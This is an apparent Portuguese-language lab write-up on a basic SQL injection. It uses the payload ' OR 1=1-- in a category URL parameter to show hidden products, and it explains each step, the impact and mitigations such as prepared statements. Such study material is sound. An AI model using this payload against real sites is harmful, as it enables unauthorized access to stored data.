# SQL Injection - Retrieve Hidden Data

## Objetivo

Explorar uma vulnerabilidade de SQL Injection para acessar dados ocultos da aplicação através da manipulação de parâmetros na URL.

---

## Vulnerabilidade

A aplicação concatenava diretamente a entrada do usuário em uma query SQL sem validação adequada.

Exemplo de query vulnerável:

```sql
SELECT * FROM products WHERE category = 'Accessories'
```

O valor enviado pelo usuário era inserido diretamente entre aspas simples na consulta SQL.

---

## Exploração

Ao manipular o parâmetro `category`, foi possível alterar completamente a lógica da query.

Payload utilizado:

```sql
' OR 1=1--
```

URL explorada:

```txt
/filter?category=' OR 1=1--
```

---

## Como o Payload Funciona

O payload funciona em três etapas:

### 1. Fechamento da string original

O primeiro `'` fecha a string da query SQL.

Exemplo:

```sql
WHERE category = ''
```

---

### 2. Inserção de condição verdadeira

A expressão:

```sql
OR 1=1
```

sempre retorna verdadeiro.

Isso faz com que o banco de dados aceite todos os registros da tabela.

---

### 3. Comentário do restante da query

O trecho:

```sql
--
```

comenta o restante da instrução SQL, evitando erros de sintaxe.

Query final executada:

```sql
SELECT * FROM products 
WHERE category = '' OR 1=1--'
```

---

## Resultado

Foi possível ignorar o filtro original da aplicação e visualizar produtos ocultos armazenados no banco de dados.

---

## Impacto

Uma vulnerabilidade SQL Injection pode permitir:

* Vazamento de dados sensíveis
* Bypass de autenticação
* Enumeração do banco de dados
* Acesso não autorizado
* Comprometimento completo da aplicação

---

## Mitigação

* Prepared Statements
* Parameterized Queries
* Validação de entrada
* ORM seguro
* Menor privilégio no banco de dados

---

## Aprendizados

Este laboratório demonstrou como a concatenação insegura de entradas do usuário em queries SQL pode comprometer completamente a segurança de uma aplicação.

Também reforçou a importância de entender a lógica da query SQL em vez de apenas memorizar payloads.
